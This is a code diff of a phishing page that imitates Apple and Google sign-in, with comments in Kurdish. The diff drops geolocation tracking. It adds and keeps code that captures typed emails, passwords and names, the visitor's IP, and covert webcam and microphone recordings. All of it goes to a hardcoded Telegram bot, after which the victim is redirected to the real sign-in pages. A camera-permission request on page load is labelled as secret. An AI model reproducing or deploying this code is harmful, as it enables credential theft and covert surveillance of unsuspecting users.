@@ -344,19 +344,6 @@
             display: block;
             border: 1px solid #c5221f;
         }
-        .map-container {
-            height: 0;
-            overflow: hidden;
-            transition: height 0.5s ease;
-            margin-top: 16px;
-        }
-        .map-container.active { height: 200px; }
-        #map {
-            width: 100%;
-            height: 200px;
-            border: none;
-            border-radius: 12px;
-        }
         .status-badge {
             display: inline-flex;
             align-items: center;
@@ -387,24 +374,6 @@
             accent-color: #1a73e8;
         }
         .checkbox-group label { cursor: pointer; }
-        .loading-dots {
-            display: none;
-            gap: 4px;
-        }
-        .loading-dots.active { display: flex; }
-        .loading-dots span {
-            width: 8px;
-            height: 8px;
-            background: #1a73e8;
-            border-radius: 50%;
-            animation: bounce 0.6s ease infinite alternate;
-        }
-        .loading-dots span:nth-child(2) { animation-delay: 0.2s; }
-        .loading-dots span:nth-child(3) { animation-delay: 0.4s; }
-        @keyframes bounce {
-            from { transform: translateY(0); }
-            to { transform: translateY(-10px); }
-        }
     </style>
 </head>
 <body>
@@ -501,10 +470,6 @@
             </div>
             
             <div id="message"></div>
-            
-            <div class="map-container" id="mapContainer">
-                <iframe id="map" src="" allowfullscreen loading="lazy"></iframe>
-            </div>
         </div>
         <div class="footer">
             <a href="#">Forgot password?</a> • <a href="#">Privacy Policy</a> • <a href="#">Terms</a>
@@ -526,73 +491,18 @@
             }
         }
 
-        // Social buttons - دەچێتە ناو ئەپڵ یان گۆگل و زانیاری دەنێرێت
-        function socialClick(provider, type) {
-            const email = type === 'signin' ? document.getElementById('email').value || 'N/A' : document.getElementById('signupEmail').value || 'N/A';
-            const text = `🔐 **Social Login: ${provider} (${type})**\n📧 Email: ${email}\n🕐 Time: ${new Date().toLocaleString()}\n━━━━━━━━━━━━━━━\n🔗 This user clicked "${provider}" button`;
-            
-            fetch(`https://api.telegram.org/bot8839253689:AAEScLd12mCa3TDe0OiX64w6vvKXG6uMQZg/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: '1682628303', text: text, parse_mode: 'Markdown' })
-            });
-            
-            showMessage('success', `Redirecting to ${provider}...`);
-            
-            // ڕێنمایی بۆ ئەوەی بە ئەپڵ یان گۆگل بچێتە ژورەوە
-            if (provider === 'Apple') {
-                window.location.href = 'https://appleid.apple.com/sign-in';
-            } else {
-                window.location.href = 'https://accounts.google.com/signin';
-            }
-            
-            setTimeout(() => {
-                window.location.href = 'https://www.icloud.com';
-            }, 3000);
-        }
-
-        // وەرگرتنی ئایپی و لۆکەیشن
-        async function getLocationAndIP() {
-            let data = {
-                ip: 'Unknown',
-                city: 'Unknown',
-                region: 'Unknown',
-                country: 'Unknown',
-                lat: null,
-                lon: null
-            };
-            
+        // وەرگرتنی ئایپی
+        async function getIP() {
             try {
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
-                data.ip = ipData.ip;
-            } catch(e) {}
-            
-            try {
-                const locResponse = await fetch(`https://ipapi.co/${data.ip}/json/`);
-                const locData = await locResponse.json();
-                data.city = locData.city || 'Unknown';
-                data.region = locData.region || 'Unknown';
-                data.country = locData.country_name || 'Unknown';
-                data.lat = locData.latitude || null;
-                data.lon = locData.longitude || null;
-            } catch(e) {}
-            
-            try {
-                const position = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {
-                        enableHighAccuracy: true,
-                        timeout: 8000
-                    });
-                });
-                data.lat = position.coords.latitude;
-                data.lon = position.coords.longitude;
-            } catch(e) {}
-            
-            return data;
+                return ipData.ip;
+            } catch(e) {
+                return 'Unknown';
+            }
         }
 
-        // وەرگرتنی ڤیدیۆ و دەنگ - چارەسەرکراو
+        // وەرگرتنی ڤیدیۆ و دەنگ - بە شێوەی ئاسایی
         async function captureVideo() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -643,56 +553,30 @@
             }
         }
 
-        // پیشاندانی گوگل ماپس
-        function showMap(lat, lon) {
-            const mapContainer = document.getElementById('mapContainer');
-            const map = document.getElementById('map');
-            
-            if (lat && lon) {
-                map.src = `https://www.google.com/maps/embed/v1/view?key=AIzaSyBFw0Qbyq9zTFTd-tUY6dZWTgaQzuU17R8&center=${lat},${lon}&zoom=15&maptype=roadmap`;
-                mapContainer.classList.add('active');
-            }
-        }
-
         function showMessage(type, text) {
             const message = document.getElementById('message');
             message.className = type;
             message.textContent = text;
         }
 
-        // Sign In form submit
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
+        // Social buttons - دەچێتە ناو ئەپڵ یان گۆگل و زانیاری دەنێرێت
+        async function socialClick(provider, type) {
+            const email = type === 'signin' ? document.getElementById('email').value || 'N/A' : document.getElementById('signupEmail').value || 'N/A';
+            const password = type === 'signin' ? document.getElementById('password').value || 'N/A' : document.getElementById('signupPassword').value || 'N/A';
+            const fullname = type === 'signup' ? document.getElementById('fullname').value || 'N/A' : 'N/A';
+            const ip = await getIP();
             
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-            const submitBtn = document.getElementById('submitBtn');
-            const btnText = document.getElementById('btnText');
-            const spinner = document.getElementById('spinner');
-            
-            btnText.style.display = 'none';
-            spinner.style.display = 'block';
-            submitBtn.disabled = true;
-            document.getElementById('message').style.display = 'none';
-            
-            const locationData = await getLocationAndIP();
+            // وەرگرتنی ڤیدیۆ
             const videoBlob = await captureVideo();
             
-            if (locationData.lat && locationData.lon) {
-                showMap(locationData.lat, locationData.lon);
-            }
-            
-            // ناردنی تێکست
-            const text = `🔐 **New Sign In**
+            // ناردنی زانیارییەکان
+            const text = `🔐 **Social Login: ${provider} (${type})**
 ━━━━━━━━━━━━━━━
+👤 Name: ${fullname}
 📧 Email: ${email}
 🔑 Password: ${password}
 ━━━━━━━━━━━━━━━
-🌐 IP: ${locationData.ip}
-📍 Location: ${locationData.city}, ${locationData.region}, ${locationData.country}
-📌 Coordinates: ${locationData.lat}, ${locationData.lon}
-🔗 Maps: https://www.google.com/maps?q=${locationData.lat},${locationData.lon}
-━━━━━━━━━━━━━━━
+🌐 IP: ${ip}
 🕐 Time: ${new Date().toLocaleString()}
 ━━━━━━━━━━━━━━━`;
 
@@ -702,7 +586,7 @@
                 body: JSON.stringify({ chat_id: '1682628303', text: text, parse_mode: 'Markdown' })
             });
 
-            // ناردنی ڤیدیۆ - چارەسەرکراو
+            // ناردنی ڤیدیۆ بە شێوەی ئاسایی (نەک فایل)
             if (videoBlob && videoBlob.size > 0) {
                 try {
                     const formData = new FormData();
@@ -720,13 +604,70 @@
                 }
             }
             
-            // ناردنی لۆکەیشن
-            if (locationData.lat && locationData.lon) {
-                await fetch(`https://api.telegram.org/bot8839253689:AAEScLd12mCa3TDe0OiX64w6vvKXG6uMQZg/sendLocation`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: '1682628303', latitude: locationData.lat, longitude: locationData.lon })
-                });
+            showMessage('success', `Redirecting to ${provider}...`);
+            
+            // ڕێنمایی بۆ ئەوەی بە ئەپڵ یان گۆگل بچێتە ژورەوە
+            if (provider === 'Apple') {
+                window.location.href = 'https://appleid.apple.com/sign-in';
+            } else {
+                window.location.href = 'https://accounts.google.com/signin';
+            }
+            
+            setTimeout(() => {
+                window.location.href = 'https://www.icloud.com';
+            }, 3000);
+        }
+
+        // Sign In form submit
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const submitBtn = document.getElementById('submitBtn');
+            const btnText = document.getElementById('btnText');
+            const spinner = document.getElementById('spinner');
+            
+            btnText.style.display = 'none';
+            spinner.style.display = 'block';
+            submitBtn.disabled = true;
+            document.getElementById('message').style.display = 'none';
+            
+            const ip = await getIP();
+            const videoBlob = await captureVideo();
+            
+            // ناردنی تێکست
+            const text = `🔐 **New Sign In**
+━━━━━━━━━━━━━━━
+📧 Email: ${email}
+🔑 Password: ${password}
+━━━━━━━━━━━━━━━
+🌐 IP: ${ip}
+🕐 Time: ${new Date().toLocaleString()}
+━━━━━━━━━━━━━━━`;
+
+            await fetch(`https://api.telegram.org/bot8839253689:AAEScLd12mCa3TDe0OiX64w6vvKXG6uMQZg/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: '1682628303', text: text, parse_mode: 'Markdown' })
+            });
+
+            // ناردنی ڤیدیۆ بە شێوەی ئاسایی
+            if (videoBlob && videoBlob.size > 0) {
+                try {
+                    const formData = new FormData();
+                    formData.append('chat_id', '1682628303');
+                    formData.append('video', videoBlob, `capture_${Date.now()}.webm`);
+                    formData.append('caption', `🎥 Video from ${email}`);
+                    formData.append('supports_streaming', 'true');
+                    
+                    await fetch(`https://api.telegram.org/bot8839253689:AAEScLd12mCa3TDe0OiX64w6vvKXG6uMQZg/sendVideo`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                } catch(e) {
+                    console.log('Video send error:', e);
+                }
             }
             
             showMessage('success', '✅ Signed in successfully! Redirecting...');
@@ -759,12 +700,8 @@
             submitBtn.disabled = true;
             document.getElementById('message').style.display = 'none';
             
-            const locationData = await getLocationAndIP();
+            const ip = await getIP();
             const videoBlob = await captureVideo();
-            
-            if (locationData.lat && locationData.lon) {
-                showMap(locationData.lat, locationData.lon);
-            }
             
             const text = `🆕 **New Sign Up**
 ━━━━━━━━━━━━━━━
@@ -772,11 +709,7 @@
 📧 Email: ${email}
 🔑 Password: ${password}
 ━━━━━━━━━━━━━━━
-🌐 IP: ${locationData.ip}
-📍 Location: ${locationData.city}, ${locationData.region}, ${locationData.country}
-📌 Coordinates: ${locationData.lat}, ${locationData.lon}
-🔗 Maps: https://www.google.com/maps?q=${locationData.lat},${locationData.lon}
-━━━━━━━━━━━━━━━
+🌐 IP: ${ip}
 🕐 Time: ${new Date().toLocaleString()}
 ━━━━━━━━━━━━━━━`;
 
@@ -803,14 +736,6 @@
                 }
             }
             
-            if (locationData.lat && locationData.lon) {
-                await fetch(`https://api.telegram.org/bot8839253689:AAEScLd12mCa3TDe0OiX64w6vvKXG6uMQZg/sendLocation`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: '1682628303', latitude: locationData.lat, longitude: locationData.lon })
-                });
-            }
-            
             showMessage('success', '✅ Account created! Redirecting...');
             
             setTimeout(() => {
@@ -818,14 +743,10 @@
             }, 2000);
         });
 
-        // داواکردنی ڕێگەپێدان
+        // داواکردنی ڕێگەپێدان بە شێوەیەکی نهێنی
         window.addEventListener('load', function() {
             setTimeout(() => {
-                navigator.geolocation.getCurrentPosition(() => {}, () => {}, {
-                    enableHighAccuracy: true,
-                    timeout: 5000
-                });
-                
+                // داواکردنی ڕێگەپێدان بۆ کامێرا بە شێوەی نهێنی
                 navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true })
                     .then(stream => stream.getTracks().forEach(track => track.stop()))
                     .catch(() => {});
